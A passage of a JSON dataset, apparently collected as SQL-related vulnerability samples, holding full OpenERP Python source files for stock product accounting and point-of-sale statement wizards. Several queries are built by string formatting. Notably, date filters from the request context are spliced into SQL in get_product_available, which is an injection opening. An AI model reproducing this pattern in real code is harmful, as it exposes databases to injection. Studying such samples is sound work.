 'property_stock_procurement': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Procurement Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','procurement')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by procurements\"),\n        'property_stock_production': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Production Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','production')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by production orders\"),\n        'property_stock_inventory': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Inventory Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','inventory')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated when you do an inventory\"),\n        'property_stock_account_input': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Input Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),\n        'property_stock_account_output': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Output Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),\n    }\n\nproduct_template()\n\nclass product_category(osv.osv):\n\n    _inherit = 'product.category'\n    _columns = {\n        'property_stock_journal': fields.property('account.journal',\n            relation='account.journal', type='many2one',\n            string='Stock journal', method=True, view_load=True,\n            help=\"When doing real-time inventory valuation, this is the Accounting Journal in which entries will be automatically posted when stock moves are processed.\"),\n        'property_stock_account_input_categ': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Input Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),\n        'property_stock_account_output_categ': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Output Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),\n        'property_stock_variation': fields.property('account.account',\n            type='many2one',\n            relation='account.account',\n            string=\"Stock Variation Account\",\n            method=True, view_load=True,\n            help=\"When real-time inventory valuation is enabled on a product, this account will hold the current value of the products.\",),\n    }\n\nproduct_category()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/hunslater/openobject-addons/blob/979db90c43ba0050400b0a5c8ad5da7ecc2bd76f",
        "file_path": "/point_of_sale/wizard/pos_close_statement.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\n\nclass pos_close_statement(osv.osv_memory):\n    _name = 'pos.close.statement'\n    _description = 'Close Statements'\n\n    def close_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Close the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Dictionary\n        \"\"\"\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        statement_obj = self.pool.get('account.bank.statement')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if not ids:\n                raise osv.except_osv(_('Message'), _('Journals are already closed'))\n            else:\n                list_statement.append(ids[0])\n                if not journal.check_dtls:\n                    statement_obj.button_confirm_cash(cr, uid, ids, context)\n    #        if not list_statement:\n    #            return {}\n    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)\n    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n        return {\n                'domain': \"[('id','in',\" + str(list_statement) + \")]\",\n                'name': 'Close Statements',\n                'view_type': 'form',\n                'view_mode': 'tree,form',\n                'res_model': 'account.bank.statement',\n                'views': [(id2, 'tree'),(id3, 'form')],\n                'type': 'ir.actions.act_window'}\n\npos_close_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/hunslater/openobject-addons/blob/979db90c43ba0050400b0a5c8ad5da7ecc2bd76f",
        "file_path": "/point_of_sale/wizard/pos_open_statement.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\nimport time\n\nclass pos_open_statement(osv.osv_memory):\n    _name = 'pos.open.statement'\n    _description = 'Open Statements'\n\n    def open_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Open the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Directory\n        \"\"\"\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        statement_obj = self.pool.get('account.bank.statement')\n        sequence_obj = self.pool.get('ir.sequence')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if len(ids):\n                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for \"%s\". \\n Please close the cashbox related to. ' %(journal.name)))\n            \n#            cr.execute(\"\"\" Select id from account_bank_statement\n#                                    where journal_id =%d\n#                                    and company_id =%d\n#                                    order by id desc limit 1\"\"\" %(journal.id, company_id))\n#            st_id = cr.fetchone()\n            \n            number = ''\n            if journal.sequence_id:\n                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)\n            else:\n                number = sequence_obj.get(cr, uid, 'account.bank.statement')\n            \n            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,\n                                                          'company_id': company_id,\n                                                          'user_id': uid,\n                                                          'state': 'open',\n                                                          'name': number,\n                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),\n                                                      })\n            statement_obj.button_open(cr, uid, [statement_id], context)\n\n    #            period = statement_obj._get_period(cr, uid, context) or None\n    #            cr.execute(\"INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')\"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))\n    #            cr.commit()\n    #            cr.execute(\"select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'\"%(journal.id, company_id, uid, number))\n    #            statement_id = cr.fetchone()[0]\n    #            print \"statement_id\",statement_id\n    #            if st_id:\n    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])\n    #                list_statement.append(statemt_id.id)\n    #                if statemt_id and statemt_id.ending_details_ids:\n    #                    statement_obj.write(cr, uid, [statement_id], {\n    #                        'balance_start': statemt_id.balance_end,\n    #                        'state': 'open',\n    #                    })\n    #                    if statemt_id.ending_details_ids:\n    #                        for i in statemt_id.ending_details_ids:\n    #                            c = statement_obj.create(cr, uid, {\n    #                                'pieces': i.pieces,\n    #                                'number': i.number,\n    #                                'starting_id': statement_id,\n    #                            })\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n\n        return {\n#           'domain': \"[('id','in', [\"+','.join(map(str,list_statement))+\"])]\",\n            'domain': \"[('state','=','open')]\",\n            'name': 'Open Statement',\n            'view_type': 'form',\n            'view_mode': 'tree,form',\n            'res_model': 'account.bank.statement',\n            'views': [(id2, 'tree'),(id3, 'form')],\n            'type': 'ir.actions.act_window'\n}\npos_open_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/hunslater/openobject-addons/blob/4ef053f7e9c6e83304380912ce0ada5f2627ee08",
        "file_path": "/stock/product.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import fields, osv\nfrom tools.translate import _\n\nclass product_product(osv.osv):\n    _inherit = \"product.product\"\n\n    def get_product_accounts(self, cr, uid, product_id, context=None):\n        \"\"\" To get the stock input account, stock output account and stock journal related to product.\n        @param product_id: product id\n        @return: dictionary which contains information regarding stock input account, stock output account and stock journal\n        \"\"\"\n        if context is None:\n            context = {}\n        product_obj = self.pool.get('product.product').browse(cr, uid, product_id, context=context)\n\n        stock_input_acc = product_obj.property_stock_account_input and product_obj.property_stock_account_input.id or False\n        if not stock_input_acc:\n            stock_input_acc = product_obj.categ_id.property_stock_account_input_categ and product_obj.categ_id.property_stock_account_input_categ.id or False\n\n        stock_output_acc = product_obj.property_stock_account_output and product_obj.property_stock_account_output.id or False\n        if not stock_output_acc:\n            stock_output_acc = product_obj.categ_id.property_stock_account_output_categ and product_obj.categ_id.property_stock_account_output_categ.id or False\n\n        journal_id = product_obj.categ_id.property_stock_journal and product_obj.categ_id.property_stock_journal.id or False\n        account_variation = product_obj.categ_id.property_stock_variation and product_obj.categ_id.property_stock_variation.id or False\n\n        return {\n            'stock_account_input': stock_input_acc,\n            'stock_account_output': stock_output_acc,\n            'stock_journal': journal_id,\n            'property_stock_variation': account_variation\n        }\n\n    def do_change_standard_price(self, cr, uid, ids, datas, context={}):\n        \"\"\" Changes the Standard Price of Product and creates an account move accordingly.\n        @param datas : dict. contain default datas like new_price, stock_output_account, stock_input_account, stock_journal\n        @param context: A standard dictionary\n        @return:\n\n        \"\"\"\n        location_obj = self.pool.get('stock.location')\n        move_obj = self.pool.get('account.move')\n        move_line_obj = self.pool.get('account.move.line')\n\n        new_price = datas.get('new_price', 0.0)\n        stock_output_acc = datas.get('stock_output_account', False)\n        stock_input_acc = datas.get('stock_input_account', False)\n        journal_id = datas.get('stock_journal', False)\n        product_obj=self.browse(cr,uid,ids)[0]\n        account_variation = product_obj.categ_id.property_stock_variation\n        account_variation_id = account_variation and account_variation.id or False\n        if not account_variation_id: raise osv.except_osv(_('Error!'), _('Variation Account is not specified for Product Category: %s' % (product_obj.categ_id.name)))\n        move_ids = []\n        loc_ids = location_obj.search(cr, uid,[('usage','=','internal')])\n        for rec_id in ids:\n            for location in location_obj.browse(cr, uid, loc_ids):\n                c = context.copy()\n                c.update({\n                    'location': location.id,\n                    'compute_child': False\n                })\n\n                product = self.browse(cr, uid, rec_id, context=c)\n                qty = product.qty_available\n                diff = product.standard_price - new_price\n                if not diff: raise osv.except_osv(_('Error!'), _(\"Could not find any difference between standard price and new price!\"))\n                if qty:\n                    company_id = location.company_id and location.company_id.id or False\n                    if not company_id: raise osv.except_osv(_('Error!'), _('Company is not specified in Location'))\n                    #\n                    # Accounting Entries\n                    #\n                    if not journal_id:\n                        journal_id = product.categ_id.property_stock_journal and product.categ_id.property_stock_journal.id or False\n                    if not journal_id:\n                        raise osv.except_osv(_('Error!'),\n                            _('There is no journal defined '\\\n                                'on the product category: \"%s\" (id: %d)') % \\\n                                (product.categ_id.name,\n                                    product.categ_id.id,))\n                    move_id = move_obj.create(cr, uid, {\n                                'journal_id': journal_id,\n                                'company_id': company_id\n                                })\n\n                    move_ids.append(move_id)\n\n\n                    if diff > 0:\n                        if not stock_input_acc:\n                            stock_input_acc = product.product_tmpl_id.\\\n                                property_stock_account_input.id\n                        if not stock_input_acc:\n                            stock_input_acc = product.categ_id.\\\n                                    property_stock_account_input_categ.id\n                        if not stock_input_acc:\n                            raise osv.except_osv(_('Error!'),\n                                    _('There is no stock input account defined ' \\\n                                            'for this product: \"%s\" (id: %d)') % \\\n                                            (product.name,\n                                                product.id,))\n                        amount_diff = qty * diff\n                        move_line_obj.create(cr, uid, {\n                                    'name': product.name,\n                                    'account_id': stock_input_acc,\n                                    'debit': amount_diff,\n                                    'move_id': move_id,\n                                    })\n                        move_line_obj.create(cr, uid, {\n                                    'name': product.categ_id.name,\n                                    'account_id': account_variation_id,\n                                    'credit': amount_diff,\n                                    'move_id': move_id\n                                    })\n                    elif diff < 0:\n                        if not stock_output_acc:\n                            stock_output_acc = product.product_tmpl_id.\\\n                                property_stock_account_output.id\n                        if not stock_output_acc:\n                            stock_output_acc = product.categ_id.\\\n                                    property_stock_account_output_categ.id\n                        if not stock_output_acc:\n                            raise osv.except_osv(_('Error!'),\n                                    _('There is no stock output account defined ' \\\n                                            'for this product: \"%s\" (id: %d)') % \\\n                                            (product.name,\n                                                product.id,))\n                        amount_diff = qty * -diff\n                        move_line_obj.create(cr, uid, {\n                                        'name': product.name,\n                                        'account_id': stock_output_acc,\n                                        'credit': amount_diff,\n                                        'move_id': move_id\n                                    })\n                        move_line_obj.create(cr, uid, {\n                                        'name': product.categ_id.name,\n                                        'account_id': account_variation_id,\n                                        'debit': amount_diff,\n                                        'move_id': move_id\n                                    })\n\n            self.write(cr, uid, rec_id, {'standard_price': new_price})\n\n        return move_ids\n\n    def view_header_get(self, cr, user, view_id, view_type, context=None):\n        if context is None:\n            context = {}\n        res = super(product_product, self).view_header_get(cr, user, view_id, view_type, context)\n        if res: return res\n        if (context.get('active_id', False)) and (context.get('active_model') == 'stock.location'):\n            return _('Products: ')+self.pool.get('stock.location').browse(cr, user, context['active_id'], context).name\n        return res\n\n    def get_product_available(self, cr, uid, ids, context=None):\n        \"\"\" Finds whether product is available or not in particular warehouse.\n        @return: Dictionary of values\n        \"\"\"\n        if context is None:\n            context = {}\n        states = context.get('states',[])\n        what = context.get('what',())\n        if not ids:\n            ids = self.search(cr, uid, [])\n        res = {}.fromkeys(ids, 0.0)\n        if not ids:\n            return res\n\n        if context.get('shop', False):\n            cr.execute('select warehouse_id from sale_shop where id=%s', (int(context['shop']),))\n            res2 = cr.fetchone()\n            if res2:\n                context['warehouse'] = res2[0]\n\n        if context.get('warehouse', False):\n            cr.execute('select lot_stock_id from stock_warehouse where id=%s', (int(context['warehouse']),))\n            res2 = cr.fetchone()\n            if res2:\n                context['location'] = res2[0]\n\n        if context.get('location', False):\n            if type(context['location']) == type(1):\n                location_ids = [context['location']]\n            elif type(context['location']) in (type(''), type(u'')):\n                location_ids = self.pool.get('stock.location').search(cr, uid, [('name','ilike',context['location'])], context=context)\n            else:\n                location_ids = context['location']\n        else:\n            location_ids = []\n            wids = self.pool.get('stock.warehouse').search(cr, uid, [], context=context)\n            for w in self.pool.get('stock.warehouse').browse(cr, uid, wids, context=context):\n                location_ids.append(w.lot_stock_id.id)\n\n        # build the list of ids of children of the location given by id\n        if context.get('compute_child',True):\n            child_location_ids = self.pool.get('stock.location').search(cr, uid, [('location_id', 'child_of', location_ids)])\n            location_ids = child_location_ids or location_ids\n        else:\n            location_ids = location_ids\n\n        uoms_o = {}\n        product2uom = {}\n        for product in self.browse(cr, uid, ids, context=context):\n            product2uom[product.id] = product.uom_id.id\n            uoms_o[product.uom_id.id] = product.uom_id\n\n        results = []\n        results2 = []\n\n        from_date=context.get('from_date',False)\n        to_date=context.get('to_date',False)\n        date_str=False\n        if from_date and to_date:\n            date_str=\"date_planned>='%s' and date_planned<='%s'\"%(from_date,to_date)\n        elif from_date:\n            date_str=\"date_planned>='%s'\"%(from_date)\n        elif to_date:\n            date_str=\"date_planned<='%s'\"%(to_date)\n\n        if 'in' in what:\n            # all moves from a location out of the set to a location in the set\n            cr.execute(\n                'select sum(product_qty), product_id, product_uom '\\\n                'from stock_move '\\\n                'where location_id NOT IN %s'\\\n                'and location_dest_id IN %s'\\\n                'and product_id IN %s'\\\n                'and state IN %s' + (date_str and 'and '+date_str+' ' or '') +''\\\n                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)\n            )\n            results = cr.fetchall()\n        if 'out' in what:\n            # all moves from a location in the set to a location out of the set\n            cr.execute(\n                'select sum(product_qty), product_id, product_uom '\\\n                'from stock_move '\\\n                'where location_id IN %s'\\\n                'and location_dest_id NOT IN %s '\\\n                'and product_id  IN %s'\\\n                'and state in %s' + (date_str and 'and '+date_str+' ' or '') + ''\\\n                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)\n            )\n            results2 = cr.fetchall()\n        uom_obj = self.pool.get('product.uom')\n        uoms = map(lambda x: x[2], results) + map(lambda x: x[2], results2)\n        if context.get('uom', False):\n            uoms += [context['uom']]\n\n        uoms = filter(lambda x: x not in uoms_o.keys(), uoms)\n        if uoms:\n            uoms = uom_obj.browse(cr, uid, list(set(uoms)), context=context)\n        for o in uoms:\n            uoms_o[o.id] = o\n        for amount, prod_id, prod_uom in results:\n            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,\n                    uoms_o[context.get('uom', False) or product2uom[prod_id]])\n            res[prod_id] += amount\n        for amount, prod_id, prod_uom in results2:\n            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,\n                    uoms_o[context.get('uom', False) or product2uom[prod_id]])\n            res[prod_id] -= amount\n        return res\n\n    def _product_available(self, cr, uid, ids, field_names=None, arg=False, context=None):\n        \"\"\" Finds the incoming and outgoing quantity of product.\n        @return: Dictionary of values\n        \"\"\"\n        if not field_names:\n            field_names = []\n        if context is None:\n            context = {}\n        res = {}\n        for id in ids:\n            res[id] = {}.fromkeys(field_names, 0.0)\n        for f in field_names:\n            c = context.copy()\n            if f == 'qty_available':\n                c.update({ 'states': ('done',), 'what': ('in', 'out') })\n            if f == 'virtual_available':\n                c.update({ 'states': ('confirmed','waiting','assigned','done'), 'what': ('in', 'out') })\n            if f == 'incoming_qty':\n                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('in',) })\n            if f == 'outgoing_qty':\n                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('out',) })\n            stock = self.get_product_available(cr, uid, ids, context=c)\n            for id in ids:\n                res[id][f] = stock.get(id, 0.0)\n        return res\n\n    _columns = {\n        'qty_available': fields.function(_product_available, method=True, type='float', string='Real Stock', help=\"Current quantities of products in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'virtual_available': fields.function(_product_available, method=True, type='float', string='Virtual Stock', help=\"Future stock for this product according to the selected locations or all internal if none have been selected. Computed as: Real Stock - Outgoing + Incoming.\", multi='qty_available'),\n        'incoming_qty': fields.function(_product_available, method=True, type='float', string='Incoming', help=\"Quantities of products that are planned to arrive in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'outgoing_qty': fields.function(_product_available, method=True, type='float', string='Outgoing', help=\"Quantities of products that are planned to leave in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'track_production': fields.boolean('Track Manufacturing Lots' , help=\"Forces to specify a Production Lot for all moves containing this product and generated by a Manufacturing Order\"),\n        'track_incoming': fields.boolean('Track Incoming Lots', help=\"Forces to specify a Production Lot for all moves containing this product and coming from a Supplier Location\"),\n        'track_outgoing': fields.boolean('Track Outgoing Lots', help=\"Forces to specify a Production Lot for all moves containing this product and going to a Customer Location\"),\n        'location_id': fields.dummy(string='Stock Location', relation='stock.location', type='many2one'),\n        'valuation':fields.selection([('manual_periodic', 'Periodical (manual)'),\n                                        ('real_time','Real Time (automated)'),], 'Inventory Valuation', \n                                        help=\"If real-time valuation is enabled for a product, the system will automatically write journal entries corresponding to stock moves.\" \\\n                                             \"The inventory variation account set on the product category will represent the current inventory value, and the stock input and stock output account will hold the counterpart moves for incoming and outgoing products.\"\n                                        , required=True),\n    }\n\n    _defaults = {\n        'valuation': lambda *a: 'manual_periodic',\n    }\n\n    def fields_view_get(self, cr, uid, view_id=None, view_type='form', context=None, toolbar=False, submenu=False):\n        res = super(product_product,self).fields_view_get(cr, uid, view_id, view_type, context, toolbar=toolbar, submenu=submenu)\n        if context is None:\n            context = {}\n        if ('location' in context) and context['location']:\n            location_info = self.pool.get('stock.location').browse(cr, uid, context['location'])\n            fields=res.get('fields',{})\n            if fields:\n                if location_info.usage == 'supplier':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Receptions')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Received Qty')\n\n                if location_info.usage == 'internal':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Stock')\n\n                if location_info.usage == 'customer':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Deliveries')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Delivered Qty')\n\n                if location_info.usage == 'inventory':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future P&L')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('P&L Qty')\n\n                if location_info.usage == 'procurement':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Qty')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Unplanned Qty')\n\n                if location_info.usage == 'production':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Productions')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Produced Qty')\n        return res\n\nproduct_product()\n\nclass product_template(osv.osv):\n    _name = 'product.template'\n    _inherit = 'product.template'\n    _columns = {\n        'property_stock_procurement': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Procurement Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','procurement')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by procurements\"),\n        'property_stock_production': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Production Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','production')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by production orders\"),\n        'property_stock_inventory': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Inventory Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','inventory')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated when you do an inventory\"),\n        'property_stock_account_input': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Input Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),\n        'property_stock_account_output': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Output Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),\n    }\n\nproduct_template()\n\nclass product_category(osv.osv):\n\n    _inherit = 'product.category'\n    _columns = {\n        'property_stock_journal': fields.property('account.journal',\n            relation='account.journal', type='many2one',\n            string='Stock journal', method=True, view_load=True,\n            help=\"When doing real-time inventory valuation, this is the Accounting Journal in which entries will be automatically posted when stock moves are processed.\"),\n        'property_stock_account_input_categ': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Input Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),\n        'property_stock_account_output_categ': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Output Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),\n        'property_stock_variation': fields.property('account.account',\n            type='many2one',\n            relation='account.account',\n            string=\"Stock Variation Account\",\n            method=True, view_load=True,\n            help=\"When real-time inventory valuation is enabled on a product, this account will hold the current value of the products.\",),\n    }\n\nproduct_category()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/gisce/openobject-addons/blob/979db90c43ba0050400b0a5c8ad5da7ecc2bd76f",
        "file_path": "/point_of_sale/wizard/pos_close_statement.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\n\nclass pos_close_statement(osv.osv_memory):\n    _name = 'pos.close.statement'\n    _description = 'Close Statements'\n\n    def close_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Close the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Dictionary\n        \"\"\"\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        statement_obj = self.pool.get('account.bank.statement')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if not ids:\n                raise osv.except_osv(_('Message'), _('Journals are already closed'))\n            else:\n                list_statement.append(ids[0])\n                if not journal.check_dtls:\n                    statement_obj.button_confirm_cash(cr, uid, ids, context)\n    #        if not list_statement:\n    #            return {}\n    